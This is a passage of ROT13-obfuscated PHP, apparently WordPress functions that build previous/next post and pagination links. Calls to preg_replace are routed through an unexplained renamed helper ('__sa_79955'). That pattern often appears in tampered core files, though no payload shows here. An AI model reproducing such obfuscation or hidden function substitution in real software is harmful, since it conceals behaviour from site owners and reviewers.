	$erfhyg = jc_pnpur_trg( $pnpur_xrl, 'cbfg-dhrevrf' );
	vs ( snyfr !== $erfhyg ) {
		vs ( $erfhyg ) {
			$erfhyg = trg_cbfg( $erfhyg );
		}
		erghea $erfhyg;
	}

	$erfhyg = $jcqo->trg_ine( $dhrel );
	vs ( ahyy === $erfhyg ) {
		$erfhyg = '';
	}

	jc_pnpur_frg( $pnpur_xrl, $erfhyg, 'cbfg-dhrevrf' );

	vs ( $erfhyg ) {
		$erfhyg = trg_cbfg( $erfhyg );
	}

	erghea $erfhyg;
}

/**
 * Ergevrirf gur nqwnprag cbfg eryngvbany yvax.
 *
 * Pna rvgure or arkg be cerivbhf cbfg eryngvbany yvax.
 *
 * @fvapr 2.8.0
 *
 * @cnenz fgevat       $gvgyr          Bcgvbany. Yvax gvgyr sbezng. Qrsnhyg '%gvgyr'.
 * @cnenz obby         $va_fnzr_grez   Bcgvbany. Jurgure yvax fubhyq or va gur fnzr gnkbabzl grez.
 *                                     Qrsnhyg snyfr.
 * @cnenz vag[]|fgevat $rkpyhqrq_grezf Bcgvbany. Neenl be pbzzn-frcnengrq yvfg bs rkpyhqrq grez VQf.
 *                                     Qrsnhyg rzcgl.
 * @cnenz obby         $cerivbhf       Bcgvbany. Jurgure gb qvfcynl yvax gb cerivbhf be arkg cbfg.
 *                                     Qrsnhyg gehr.
 * @cnenz fgevat       $gnkbabzl       Bcgvbany. Gnkbabzl, vs `$va_fnzr_grez` vf gehr. Qrsnhyg 'pngrtbel'.
 * @erghea fgevat|ibvq Gur nqwnprag cbfg eryngvbany yvax HEY.
 */
shapgvba trg_nqwnprag_cbfg_ery_yvax( $gvgyr = '%gvgyr', $va_fnzr_grez = snyfr, $rkpyhqrq_grezf = '', $cerivbhf = gehr, $gnkbabzl = 'pngrtbel' ) {
	$cbfg = trg_cbfg();
	vs ( $cerivbhf && vf_nggnpuzrag() && $cbfg ) {
		$cbfg = trg_cbfg( $cbfg->cbfg_cnerag );
	} ryfr {
		$cbfg = trg_nqwnprag_cbfg( $va_fnzr_grez, $rkpyhqrq_grezf, $cerivbhf, $gnkbabzl );
	}

	vs ( rzcgl( $cbfg ) ) {
		erghea;
	}

	$cbfg_gvgyr = gur_gvgyr_nggevohgr(
		neenl(
			'rpub' => snyfr,
			'cbfg' => $cbfg,
		)
	);

	vs ( rzcgl( $cbfg_gvgyr ) ) {
		$cbfg_gvgyr = $cerivbhf ? __( 'Cerivbhf Cbfg' ) : __( 'Arkg Cbfg' );
	}

	$qngr = zlfdy2qngr( trg_bcgvba( 'qngr_sbezng' ), $cbfg->cbfg_qngr );

	$gvgyr = fge_ercynpr( '%gvgyr', $cbfg_gvgyr, $gvgyr );
	$gvgyr = fge_ercynpr( '%qngr', $qngr, $gvgyr );

	$yvax  = $cerivbhf ? \"<yvax ery='ceri' gvgyr='\" : \"<yvax ery='arkg' gvgyr='\";
	$yvax .= rfp_ngge( $gvgyr );
	$yvax .= \"' uers='\" . trg_creznyvax( $cbfg ) . \"' />\a\";

	$nqwnprag = $cerivbhf ? 'cerivbhf' : 'arkg';

	/**
	 * Svygref gur nqwnprag cbfg eryngvbany yvax.
	 *
	 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$nqwnprag`, ersref gb gur glcr
	 * bs nqwnprapl, 'arkg' be 'cerivbhf'.
	 *
	 * Cbffvoyr ubbx anzrf vapyhqr:
	 *
	 *  - `arkg_cbfg_ery_yvax`
	 *  - `cerivbhf_cbfg_ery_yvax`
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz fgevat $yvax Gur eryngvbany yvax.
	 */
	erghea nccyl_svygref( \"{$nqwnprag}_cbfg_ery_yvax\", $yvax );
}

/**
 * Qvfcynlf gur eryngvbany yvaxf sbe gur cbfgf nqwnprag gb gur pheerag cbfg.
 *
 * @fvapr 2.8.0
 *
 * @cnenz fgevat       $gvgyr          Bcgvbany. Yvax gvgyr sbezng. Qrsnhyg '%gvgyr'.
 * @cnenz obby         $va_fnzr_grez   Bcgvbany. Jurgure yvax fubhyq or va gur fnzr gnkbabzl grez.
 *                                     Qrsnhyg snyfr.
 * @cnenz vag[]|fgevat $rkpyhqrq_grezf Bcgvbany. Neenl be pbzzn-frcnengrq yvfg bs rkpyhqrq grez VQf.
 *                                     Qrsnhyg rzcgl.
 * @cnenz fgevat       $gnkbabzl       Bcgvbany. Gnkbabzl, vs `$va_fnzr_grez` vf gehr. Qrsnhyg 'pngrtbel'.
 */
shapgvba nqwnprag_cbfgf_ery_yvax( $gvgyr = '%gvgyr', $va_fnzr_grez = snyfr, $rkpyhqrq_grezf = '', $gnkbabzl = 'pngrtbel' ) {
	rpub trg_nqwnprag_cbfg_ery_yvax( $gvgyr, $va_fnzr_grez, $rkpyhqrq_grezf, gehr, $gnkbabzl );
	rpub trg_nqwnprag_cbfg_ery_yvax( $gvgyr, $va_fnzr_grez, $rkpyhqrq_grezf, snyfr, $gnkbabzl );
}

/**
 * Qvfcynlf eryngvbany yvaxf sbe gur cbfgf nqwnprag gb gur pheerag cbfg sbe fvatyr cbfg cntrf.
 *
 * Guvf vf zrnag gb or nggnpurq gb npgvbaf yvxr 'jc_urnq'. Qb abg pnyy guvf qverpgyl va cyhtvaf
 * be gurzr grzcyngrf.
 *
 * @fvapr 3.0.0
 * @fvapr 5.6.0 Ab ybatre hfrq va pber.
 *
 * @frr nqwnprag_cbfgf_ery_yvax()
 */
shapgvba nqwnprag_cbfgf_ery_yvax_jc_urnq() {
	vs ( ! vf_fvatyr() || vf_nggnpuzrag() ) {
		erghea;
	}
	nqwnprag_cbfgf_ery_yvax();
}

/**
 * Qvfcynlf gur eryngvbany yvax sbe gur arkg cbfg nqwnprag gb gur pheerag cbfg.
 *
 * @fvapr 2.8.0
 *
 * @frr trg_nqwnprag_cbfg_ery_yvax()
 *
 * @cnenz fgevat       $gvgyr          Bcgvbany. Yvax gvgyr sbezng. Qrsnhyg '%gvgyr'.
 * @cnenz obby         $va_fnzr_grez   Bcgvbany. Jurgure yvax fubhyq or va gur fnzr gnkbabzl grez.
 *                                     Qrsnhyg snyfr.
 * @cnenz vag[]|fgevat $rkpyhqrq_grezf Bcgvbany. Neenl be pbzzn-frcnengrq yvfg bs rkpyhqrq grez VQf.
 *                                     Qrsnhyg rzcgl.
 * @cnenz fgevat       $gnkbabzl       Bcgvbany. Gnkbabzl, vs `$va_fnzr_grez` vf gehr. Qrsnhyg 'pngrtbel'.
 */
shapgvba arkg_cbfg_ery_yvax( $gvgyr = '%gvgyr', $va_fnzr_grez = snyfr, $rkpyhqrq_grezf = '', $gnkbabzl = 'pngrtbel' ) {
	rpub trg_nqwnprag_cbfg_ery_yvax( $gvgyr, $va_fnzr_grez, $rkpyhqrq_grezf, snyfr, $gnkbabzl );
}

/**
 * Qvfcynlf gur eryngvbany yvax sbe gur cerivbhf cbfg nqwnprag gb gur pheerag cbfg.
 *
 * @fvapr 2.8.0
 *
 * @frr trg_nqwnprag_cbfg_ery_yvax()
 *
 * @cnenz fgevat       $gvgyr          Bcgvbany. Yvax gvgyr sbezng. Qrsnhyg '%gvgyr'.
 * @cnenz obby         $va_fnzr_grez   Bcgvbany. Jurgure yvax fubhyq or va gur fnzr gnkbabzl grez.
 *                                     Qrsnhyg snyfr.
 * @cnenz vag[]|fgevat $rkpyhqrq_grezf Bcgvbany. Neenl be pbzzn-frcnengrq yvfg bs rkpyhqrq grez VQf.
 *                                     Qrsnhyg gehr.
 * @cnenz fgevat       $gnkbabzl       Bcgvbany. Gnkbabzl, vs `$va_fnzr_grez` vf gehr. Qrsnhyg 'pngrtbel'.
 */
shapgvba ceri_cbfg_ery_yvax( $gvgyr = '%gvgyr', $va_fnzr_grez = snyfr, $rkpyhqrq_grezf = '', $gnkbabzl = 'pngrtbel' ) {
	rpub trg_nqwnprag_cbfg_ery_yvax( $gvgyr, $va_fnzr_grez, $rkpyhqrq_grezf, gehr, $gnkbabzl );
}

/**
 * Ergevrirf gur obhaqnel cbfg.
 *
 * Obhaqnel orvat rvgure gur svefg be ynfg cbfg ol choyvfu qngr jvguva gur pbafgenvagf fcrpvsvrq
 * ol `$va_fnzr_grez` be `$rkpyhqrq_grezf`.
 *
 * @fvapr 2.8.0
 *
 * @cnenz obby         $va_fnzr_grez   Bcgvbany. Jurgure erghearq cbfg fubhyq or va gur fnzr gnkbabzl grez.
 *                                     Qrsnhyg snyfr.
 * @cnenz vag[]|fgevat $rkpyhqrq_grezf Bcgvbany. Neenl be pbzzn-frcnengrq yvfg bs rkpyhqrq grez VQf.
 *                                     Qrsnhyg rzcgl.
 * @cnenz obby         $fgneg          Bcgvbany. Jurgure gb ergevrir svefg be ynfg cbfg.
 *                                     Qrsnhyg gehr.
 * @cnenz fgevat       $gnkbabzl       Bcgvbany. Gnkbabzl, vs `$va_fnzr_grez` vf gehr. Qrsnhyg 'pngrtbel'.
 * @erghea neenl|ahyy Neenl pbagnvavat gur obhaqnel cbfg bowrpg vs fhpprffshy, ahyy bgurejvfr.
 */
shapgvba trg_obhaqnel_cbfg( $va_fnzr_grez = snyfr, $rkpyhqrq_grezf = '', $fgneg = gehr, $gnkbabzl = 'pngrtbel' ) {
	$cbfg = trg_cbfg();

	vs ( ! $cbfg || ! vf_fvatyr() || vf_nggnpuzrag() || ! gnkbabzl_rkvfgf( $gnkbabzl ) ) {
		erghea ahyy;
	}

	$dhrel_netf = neenl(
		'cbfgf_cre_cntr'         => 1,
		'beqre'                  => $fgneg ? 'NFP' : 'QRFP',
		'hcqngr_cbfg_grez_pnpur' => snyfr,
		'hcqngr_cbfg_zrgn_pnpur' => snyfr,
	);

	$grez_neenl = neenl();

	vs ( ! vf_neenl( $rkpyhqrq_grezf ) ) {
		vs ( ! rzcgl( $rkpyhqrq_grezf ) ) {
			$rkpyhqrq_grezf = rkcybqr( ',', $rkpyhqrq_grezf );
		} ryfr {
			$rkpyhqrq_grezf = neenl();
		}
	}

	vs ( $va_fnzr_grez || ! rzcgl( $rkpyhqrq_grezf ) ) {
		vs ( $va_fnzr_grez ) {
			$grez_neenl = jc_trg_bowrpg_grezf( $cbfg->VQ, $gnkbabzl, neenl( 'svryqf' => 'vqf' ) );
		}

		vs ( ! rzcgl( $rkpyhqrq_grezf ) ) {
			$rkpyhqrq_grezf = neenl_znc( 'vaginy', $rkpyhqrq_grezf );
			$rkpyhqrq_grezf = neenl_qvss( $rkpyhqrq_grezf, $grez_neenl );

			$vairefr_grezf = neenl();
			sbernpu ( $rkpyhqrq_grezf nf $rkpyhqrq_grez ) {
				$vairefr_grezf[] = $rkpyhqrq_grez * -1;
			}
			$rkpyhqrq_grezf = $vairefr_grezf;
		}

		$dhrel_netf['gnk_dhrel'] = neenl(
			neenl(
				'gnkbabzl' => $gnkbabzl,
				'grezf'    => neenl_zretr( $grez_neenl, $rkpyhqrq_grezf ),
			),
		);
	}

	erghea trg_cbfgf( $dhrel_netf );
}

/**
 * Ergevrirf gur cerivbhf cbfg yvax gung vf nqwnprag gb gur pheerag cbfg.
 *
 * @fvapr 3.7.0
 *
 * @cnenz fgevat       $sbezng         Bcgvbany. Yvax napube sbezng. Qrsnhyg '&yndhb; %yvax'.
 * @cnenz fgevat       $yvax           Bcgvbany. Yvax creznyvax sbezng. Qrsnhyg '%gvgyr'.
 * @cnenz obby         $va_fnzr_grez   Bcgvbany. Jurgure yvax fubhyq or va gur fnzr gnkbabzl grez.
 *                                     Qrsnhyg snyfr.
 * @cnenz vag[]|fgevat $rkpyhqrq_grezf Bcgvbany. Neenl be pbzzn-frcnengrq yvfg bs rkpyhqrq grez VQf.
 *                                     Qrsnhyg rzcgl.
 * @cnenz fgevat       $gnkbabzl       Bcgvbany. Gnkbabzl, vs `$va_fnzr_grez` vf gehr. Qrsnhyg 'pngrtbel'.
 * @erghea fgevat Gur yvax HEY bs gur cerivbhf cbfg va eryngvba gb gur pheerag cbfg.
 */
shapgvba trg_cerivbhf_cbfg_yvax( $sbezng = '&yndhb; %yvax', $yvax = '%gvgyr', $va_fnzr_grez = snyfr, $rkpyhqrq_grezf = '', $gnkbabzl = 'pngrtbel' ) {
	erghea trg_nqwnprag_cbfg_yvax( $sbezng, $yvax, $va_fnzr_grez, $rkpyhqrq_grezf, gehr, $gnkbabzl );
}

/**
 * Qvfcynlf gur cerivbhf cbfg yvax gung vf nqwnprag gb gur pheerag cbfg.
 *
 * @fvapr 1.5.0
 *
 * @frr trg_cerivbhf_cbfg_yvax()
 *
 * @cnenz fgevat       $sbezng         Bcgvbany. Yvax napube sbezng. Qrsnhyg '&yndhb; %yvax'.
 * @cnenz fgevat       $yvax           Bcgvbany. Yvax creznyvax sbezng. Qrsnhyg '%gvgyr'.
 * @cnenz obby         $va_fnzr_grez   Bcgvbany. Jurgure yvax fubhyq or va gur fnzr gnkbabzl grez.
 *                                     Qrsnhyg snyfr.
 * @cnenz vag[]|fgevat $rkpyhqrq_grezf Bcgvbany. Neenl be pbzzn-frcnengrq yvfg bs rkpyhqrq grez VQf.
 *                                     Qrsnhyg rzcgl.
 * @cnenz fgevat       $gnkbabzl       Bcgvbany. Gnkbabzl, vs `$va_fnzr_grez` vf gehr. Qrsnhyg 'pngrtbel'.
 */
shapgvba cerivbhf_cbfg_yvax( $sbezng = '&yndhb; %yvax', $yvax = '%gvgyr', $va_fnzr_grez = snyfr, $rkpyhqrq_grezf = '', $gnkbabzl = 'pngrtbel' ) {
	rpub trg_cerivbhf_cbfg_yvax( $sbezng, $yvax, $va_fnzr_grez, $rkpyhqrq_grezf, $gnkbabzl );
}

/**
 * Ergevrirf gur arkg cbfg yvax gung vf nqwnprag gb gur pheerag cbfg.
 *
 * @fvapr 3.7.0
 *
 * @cnenz fgevat       $sbezng         Bcgvbany. Yvax napube sbezng. Qrsnhyg '&yndhb; %yvax'.
 * @cnenz fgevat       $yvax           Bcgvbany. Yvax creznyvax sbezng. Qrsnhyg '%gvgyr'.
 * @cnenz obby         $va_fnzr_grez   Bcgvbany. Jurgure yvax fubhyq or va gur fnzr gnkbabzl grez.
 *                                     Qrsnhyg snyfr.
 * @cnenz vag[]|fgevat $rkpyhqrq_grezf Bcgvbany. Neenl be pbzzn-frcnengrq yvfg bs rkpyhqrq grez VQf.
 *                                     Qrsnhyg rzcgl.
 * @cnenz fgevat       $gnkbabzl       Bcgvbany. Gnkbabzl, vs `$va_fnzr_grez` vf gehr. Qrsnhyg 'pngrtbel'.
 * @erghea fgevat Gur yvax HEY bs gur arkg cbfg va eryngvba gb gur pheerag cbfg.
 */
shapgvba trg_arkg_cbfg_yvax( $sbezng = '%yvax &endhb;', $yvax = '%gvgyr', $va_fnzr_grez = snyfr, $rkpyhqrq_grezf = '', $gnkbabzl = 'pngrtbel' ) {
	erghea trg_nqwnprag_cbfg_yvax( $sbezng, $yvax, $va_fnzr_grez, $rkpyhqrq_grezf, snyfr, $gnkbabzl );
}

/**
 * Qvfcynlf gur arkg cbfg yvax gung vf nqwnprag gb gur pheerag cbfg.
 *
 * @fvapr 1.5.0
 *
 * @frr trg_arkg_cbfg_yvax()
 *
 * @cnenz fgevat       $sbezng         Bcgvbany. Yvax napube sbezng. Qrsnhyg '&yndhb; %yvax'.
 * @cnenz fgevat       $yvax           Bcgvbany. Yvax creznyvax sbezng. Qrsnhyg '%gvgyr'.
 * @cnenz obby         $va_fnzr_grez   Bcgvbany. Jurgure yvax fubhyq or va gur fnzr gnkbabzl grez.
 *                                     Qrsnhyg snyfr.
 * @cnenz vag[]|fgevat $rkpyhqrq_grezf Bcgvbany. Neenl be pbzzn-frcnengrq yvfg bs rkpyhqrq grez VQf.
 *                                     Qrsnhyg rzcgl.
 * @cnenz fgevat       $gnkbabzl       Bcgvbany. Gnkbabzl, vs `$va_fnzr_grez` vf gehr. Qrsnhyg 'pngrtbel'.
 */
shapgvba arkg_cbfg_yvax( $sbezng = '%yvax &endhb;', $yvax = '%gvgyr', $va_fnzr_grez = snyfr, $rkpyhqrq_grezf = '', $gnkbabzl = 'pngrtbel' ) {
	rpub trg_arkg_cbfg_yvax( $sbezng, $yvax, $va_fnzr_grez, $rkpyhqrq_grezf, $gnkbabzl );
}

/**
 * Ergevrirf gur nqwnprag cbfg yvax.
 *
 * Pna or rvgure arkg cbfg yvax be cerivbhf.
 *
 * @fvapr 3.7.0
 *
 * @cnenz fgevat       $sbezng         Yvax napube sbezng.
 * @cnenz fgevat       $yvax           Yvax creznyvax sbezng.
 * @cnenz obby         $va_fnzr_grez   Bcgvbany. Jurgure yvax fubhyq or va gur fnzr gnkbabzl grez.
 *                                     Qrsnhyg snyfr.
 * @cnenz vag[]|fgevat $rkpyhqrq_grezf Bcgvbany. Neenl be pbzzn-frcnengrq yvfg bs rkpyhqrq grezf VQf.
 *                                     Qrsnhyg rzcgl.
 * @cnenz obby         $cerivbhf       Bcgvbany. Jurgure gb qvfcynl yvax gb cerivbhf be arkg cbfg.
 *                                     Qrsnhyg gehr.
 * @cnenz fgevat       $gnkbabzl       Bcgvbany. Gnkbabzl, vs `$va_fnzr_grez` vf gehr. Qrsnhyg 'pngrtbel'.
 * @erghea fgevat Gur yvax HEY bs gur cerivbhf be arkg cbfg va eryngvba gb gur pheerag cbfg.
 */
shapgvba trg_nqwnprag_cbfg_yvax( $sbezng, $yvax, $va_fnzr_grez = snyfr, $rkpyhqrq_grezf = '', $cerivbhf = gehr, $gnkbabzl = 'pngrtbel' ) {
	vs ( $cerivbhf && vf_nggnpuzrag() ) {
		$cbfg = trg_cbfg( trg_cbfg()->cbfg_cnerag );
	} ryfr {
		$cbfg = trg_nqwnprag_cbfg( $va_fnzr_grez, $rkpyhqrq_grezf, $cerivbhf, $gnkbabzl );
	}

	vs ( ! $cbfg ) {
		$bhgchg = '';
	} ryfr {
		$gvgyr = $cbfg->cbfg_gvgyr;

		vs ( rzcgl( $cbfg->cbfg_gvgyr ) ) {
			$gvgyr = $cerivbhf ? __( 'Cerivbhf Cbfg' ) : __( 'Arkg Cbfg' );
		}

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/cbfg-grzcyngr.cuc */
		$gvgyr = nccyl_svygref( 'gur_gvgyr', $gvgyr, $cbfg->VQ );

		$qngr = zlfdy2qngr( trg_bcgvba( 'qngr_sbezng' ), $cbfg->cbfg_qngr );
		$ery  = $cerivbhf ? 'ceri' : 'arkg';

		$fgevat = '<n uers=\"' . trg_creznyvax( $cbfg ) . '\" ery=\"' . $ery . '\">';
		$vayvax = fge_ercynpr( '%gvgyr', $gvgyr, $yvax );
		$vayvax = fge_ercynpr( '%qngr', $qngr, $vayvax );
		$vayvax = $fgevat . $vayvax . '</n>';

		$bhgchg = fge_ercynpr( '%yvax', $vayvax, $sbezng );
	}

	$nqwnprag = $cerivbhf ? 'cerivbhf' : 'arkg';

	/**
	 * Svygref gur nqwnprag cbfg yvax.
	 *
	 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$nqwnprag`, ersref gb gur glcr
	 * bs nqwnprapl, 'arkg' be 'cerivbhf'.
	 *
	 * Cbffvoyr ubbx anzrf vapyhqr:
	 *
	 *  - `arkg_cbfg_yvax`
	 *  - `cerivbhf_cbfg_yvax`
	 *
	 * @fvapr 2.6.0
	 * @fvapr 4.2.0 Nqqrq gur `$nqwnprag` cnenzrgre.
	 *
	 * @cnenz fgevat         $bhgchg   Gur nqwnprag cbfg yvax.
	 * @cnenz fgevat         $sbezng   Yvax napube sbezng.
	 * @cnenz fgevat         $yvax     Yvax creznyvax sbezng.
	 * @cnenz JC_Cbfg|fgevat $cbfg     Gur nqwnprag cbfg. Rzcgl fgevat vs ab pbeerfcbaqvat cbfg rkvfgf.
	 * @cnenz fgevat         $nqwnprag Jurgure gur cbfg vf cerivbhf be arkg.
	 */
	erghea nccyl_svygref( \"{$nqwnprag}_cbfg_yvax\", $bhgchg, $sbezng, $yvax, $cbfg, $nqwnprag );
}

/**
 * Qvfcynlf gur nqwnprag cbfg yvax.
 *
 * Pna or rvgure arkg cbfg yvax be cerivbhf.
 *
 * @fvapr 2.5.0
 *
 * @cnenz fgevat       $sbezng         Yvax napube sbezng.
 * @cnenz fgevat       $yvax           Yvax creznyvax sbezng.
 * @cnenz obby         $va_fnzr_grez   Bcgvbany. Jurgure yvax fubhyq or va gur fnzr gnkbabzl grez.
 *                                     Qrsnhyg snyfr.
 * @cnenz vag[]|fgevat $rkpyhqrq_grezf Bcgvbany. Neenl be pbzzn-frcnengrq yvfg bs rkpyhqrq pngrtbel VQf.
 *                                     Qrsnhyg rzcgl.
 * @cnenz obby         $cerivbhf       Bcgvbany. Jurgure gb qvfcynl yvax gb cerivbhf be arkg cbfg.
 *                                     Qrsnhyg gehr.
 * @cnenz fgevat       $gnkbabzl       Bcgvbany. Gnkbabzl, vs `$va_fnzr_grez` vf gehr. Qrsnhyg 'pngrtbel'.
 */
shapgvba nqwnprag_cbfg_yvax( $sbezng, $yvax, $va_fnzr_grez = snyfr, $rkpyhqrq_grezf = '', $cerivbhf = gehr, $gnkbabzl = 'pngrtbel' ) {
	rpub trg_nqwnprag_cbfg_yvax( $sbezng, $yvax, $va_fnzr_grez, $rkpyhqrq_grezf, $cerivbhf, $gnkbabzl );
}

/**
 * Ergevrirf gur yvax sbe n cntr ahzore.
 *
 * @fvapr 1.5.0
 *
 * @tybony JC_Erjevgr $jc_erjevgr JbeqCerff erjevgr pbzcbarag.
 *
 * @cnenz vag  $cntrahz Bcgvbany. Cntr ahzore. Qrsnhyg 1.
 * @cnenz obby $rfpncr  Bcgvbany. Jurgure gb rfpncr gur HEY sbe qvfcynl, jvgu rfp_hey().
 *                      Vs frg gb snyfr, cercnerf gur HEY jvgu fnavgvmr_hey(). Qrsnhyg gehr.
 * @erghea fgevat Gur yvax HEY sbe gur tvira cntr ahzore.
 */
shapgvba trg_cntrahz_yvax( $cntrahz = 1, $rfpncr = gehr ) {
	tybony $jc_erjevgr;

	$cntrahz = (vag) $cntrahz;

	$erdhrfg = erzbir_dhrel_net( 'cntrq' );

	$ubzr_ebbg = cnefr_hey( ubzr_hey() );
	$ubzr_ebbg = ( vffrg( $ubzr_ebbg['cngu'] ) ) ? $ubzr_ebbg['cngu'] : '';
	$ubzr_ebbg = cert_dhbgr( $ubzr_ebbg, '|' );

	$erdhrfg = __sa_79955( '|^' . $ubzr_ebbg . '|v', '', $erdhrfg );
	$erdhrfg = __sa_79955( '|^/+|', '', $erdhrfg );

	vs ( ! $jc_erjevgr->hfvat_creznyvaxf() || vf_nqzva() ) {
		$onfr = genvyvatfynfuvg( trg_oybtvasb( 'hey' ) );

		vs ( $cntrahz > 1 ) {
			$erfhyg = nqq_dhrel_net( 'cntrq', $cntrahz, $onfr . $erdhrfg );
		} ryfr {
			$erfhyg = $onfr . $erdhrfg;
		}
	} ryfr {
		$df_ertrk = '|\?.*?$|';
		cert_zngpu( $df_ertrk, $erdhrfg, $df_zngpu );

		$cnegf   = neenl();
		$cnegf[] = hagenvyvatfynfuvg( trg_oybtvasb( 'hey' ) );

		vs ( ! rzcgl( $df_zngpu[0] ) ) {
			$dhrel_fgevat = $df_zngpu[0];
			$erdhrfg      = __sa_79955( $df_ertrk, '', $erdhrfg );
		} ryfr {
			$dhrel_fgevat = '';
		}

		$erdhrfg = __sa_79955( \"|$jc_erjevgr->cntvangvba_onfr/\q+/?$|\", '', $erdhrfg );
		$erdhrfg = __sa_79955( '|^' . cert_dhbgr( $jc_erjevgr->vaqrk, '|' ) . '|v', '', $erdhrfg );
		$erdhrfg = ygevz( $erdhrfg, '/' );

		vs ( $jc_erjevgr->hfvat_vaqrk_creznyvaxf() && ( $cntrahz > 1 || '' !== $erdhrfg ) ) {
			$cnegf[] = $jc_erjevgr->vaqrk;
		}

		$cnegf[] = hagenvyvatfynfuvg( $erdhrfg );

		vs ( $cntrahz > 1 ) {
			$cnegf[] = $jc_erjevgr->cntvangvba_onfr;
			$cnegf[] = $cntrahz;
		}

		$erfhyg = hfre_genvyvatfynfuvg( vzcybqr( '/', neenl_svygre( $cnegf ) ), 'cntrq' );
		vs ( ! rzcgl( $dhrel_fgevat ) ) {
			$erfhyg .= $dhrel_fgevat;
		}
	}

	/**
	 * Svygref gur cntr ahzore yvax sbe gur pheerag erdhrfg.
	 *
	 * @fvapr 2.5.0
	 * @fvapr 5.2.0 Nqqrq gur `$cntrahz` nethzrag.
	 *
	 * @cnenz fgevat $erfhyg  Gur cntr ahzore yvax.
	 * @cnenz vag    $cntrahz Gur cntr ahzore.
	 */
	$erfhyg = nccyl_svygref( 'trg_cntrahz_yvax', $erfhyg, $cntrahz );

	vs ( $rfpncr ) {
		erghea rfp_hey( $erfhyg );
	} ryfr {
		erghea fnavgvmr_hey( $erfhyg );
	}
}

/**
 * Ergevrirf gur arkg cbfgf cntr yvax.
 *
 * Onpxcbegrq sebz 2.1.3 gb 2.0.10.
 *
 * @fvapr 2.0.10
 *
 * @tybony vag $cntrq
 *
 * @cnenz vag $znk_cntr Bcgvbany. Znk cntrf. Qrsnhyg 0.
 * @erghea fgevat|ibvq Gur yvax HEY sbe arkg cbfgf cntr.
 */
shapgvba trg_arkg_cbfgf_cntr_yvax( $znk_cntr = 0 ) {
	tybony $cntrq;

	vs ( ! vf_fvatyr() ) {
		vs ( ! $cntrq ) {
			$cntrq = 1;
		}

		$arkg_cntr = (vag) $cntrq + 1;

		vs ( ! $znk_cntr || $znk_cntr >= $arkg_cntr ) {
			erghea trg_cntrahz_yvax( $arkg_cntr );
		}
	}
}

/**
 * Qvfcynlf be ergevrirf gur arkg cbfgf cntr yvax.
 *
 * @fvapr 0.71
 *
 * @cnenz vag  $znk_cntr Bcgvbany. Znk cntrf. Qrsnhyg 0.
 * @cnenz obby $qvfcynl  Bcgvbany. Jurgure gb rpub gur yvax. Qrsnhyg gehr.
 * @erghea fgevat|ibvq Gur yvax HEY sbe arkg cbfgf cntr vs `$qvfcynl = snyfr`.
 */
shapgvba arkg_cbfgf( $znk_cntr = 0, $qvfcynl = gehr ) {
	$yvax   = trg_arkg_cbfgf_cntr_yvax( $znk_cntr );
	$bhgchg = $yvax ? rfp_hey( $yvax ) : '';

	vs ( $qvfcynl ) {
		rpub $bhgchg;
	} ryfr {
		erghea $bhgchg;
	}
}

/**
 * Ergevrirf gur arkg cbfgf cntr yvax.
 *
 * @fvapr 2.7.0
 *
 * @tybony vag      $cntrq
 * @tybony JC_Dhrel $jc_dhrel JbeqCerff Dhrel bowrpg.
 *
 * @cnenz fgevat $ynory    Pbagrag sbe yvax grkg.
 * @cnenz vag    $znk_cntr Bcgvbany. Znk cntrf. Qrsnhyg 0.
 * @erghea fgevat|ibvq UGZY-sbeznggrq arkg cbfgf cntr yvax.
 */
shapgvba trg_arkg_cbfgf_yvax( $ynory = ahyy, $znk_cntr = 0 ) {
	tybony $cntrq, $jc_dhrel;

	vs ( ! $znk_cntr ) {
		$znk_cntr = $jc_dhrel->znk_ahz_cntrf;
	}

	vs ( ! $cntrq ) {
		$cntrq = 1;
	}

	$arkg_cntr = (vag) $cntrq + 1;

	vs ( ahyy === $ynory ) {
		$ynory = __( 'Arkg Cntr &endhb;' );
	}

	vs ( ! vf_fvatyr() && ( $arkg_cntr <= $znk_cntr ) ) {
		/**
		 * Svygref gur napube gnt nggevohgrf sbe gur arkg cbfgf cntr yvax.
		 *
		 * @fvapr 2.7.0
		 *
		 * @cnenz fgevat $nggevohgrf Nggevohgrf sbe gur napube gnt.
		 */
		$ngge = nccyl_svygref( 'arkg_cbfgf_yvax_nggevohgrf', '' );

		erghea fcevags(
			'<n uers=\"%1$f\" %2$f>%3$f</n>',
			arkg_cbfgf( $znk_cntr, snyfr ),
			$ngge,
			__sa_79955( '/&([^#])(?![n-m]{1,8};)/v', '&#038;$1', $ynory )
		);
	}
}

/**
 * Qvfcynlf gur arkg cbfgf cntr yvax.
 *
 * @fvapr 0.71
 *
 * @cnenz fgevat $ynory    Pbagrag sbe yvax grkg.
 * @cnenz vag    $znk_cntr Bcgvbany. Znk cntrf. Qrsnhyg 0.
 */
shapgvba arkg_cbfgf_yvax( $ynory = ahyy, $znk_cntr = 0 ) {
	rpub trg_arkg_cbfgf_yvax( $ynory, $znk_cntr );
}

/**
 * Ergevrirf gur cerivbhf cbfgf cntr yvax.
 *
 * Jvyy bayl erghea fgevat, vs abg ba n fvatyr cntr be cbfg.
 *
 * Onpxcbegrq gb 2.0.10 sebz 2.1.3.
 *
 * @fvapr 2.0.10
 *
 * @tybony vag $cntrq
 *
 * @erghea fgevat|ibvq Gur yvax sbe gur cerivbhf cbfgf cntr.
 */
shapgvba trg_cerivbhf_cbfgf_cntr_yvax() {
	tybony $cntrq;

	vs ( ! vf_fvatyr() ) {
		$cerivbhf_cntr = (vag) $cntrq - 1;

		vs ( $cerivbhf_cntr < 1 ) {
			$cerivbhf_cntr = 1;
		}

		erghea trg_cntrahz_yvax( $cerivbhf_cntr );
	}
}

/**
 * Qvfcynlf be ergevrirf gur cerivbhf cbfgf cntr yvax.
 *
 * @fvapr 0.71
 *
 * @cnenz obby $qvfcynl Bcgvbany. Jurgure gb rpub gur yvax. Qrsnhyg gehr.
 * @erghea fgevat|ibvq Gur cerivbhf cbfgf cntr yvax vs `$qvfcynl = snyfr`.
 */
shapgvba cerivbhf_cbfgf( $qvfcynl = gehr ) {
	$bhgchg = rfp_hey( trg_cerivbhf_cbfgf_cntr_yvax() );

	vs ( $qvfcynl ) {
		rpub $bhgchg;
	} ryfr {
		erghea $bhgchg;
	}
}

/**
 * Ergevrirf gur cerivbhf cbfgf cntr yvax.
 *
 * @fvapr 2.7.0
 *
 * @tybony vag $cntrq
 *
 * @cnenz fgevat $ynory Bcgvbany. Cerivbhf cntr yvax grkg.
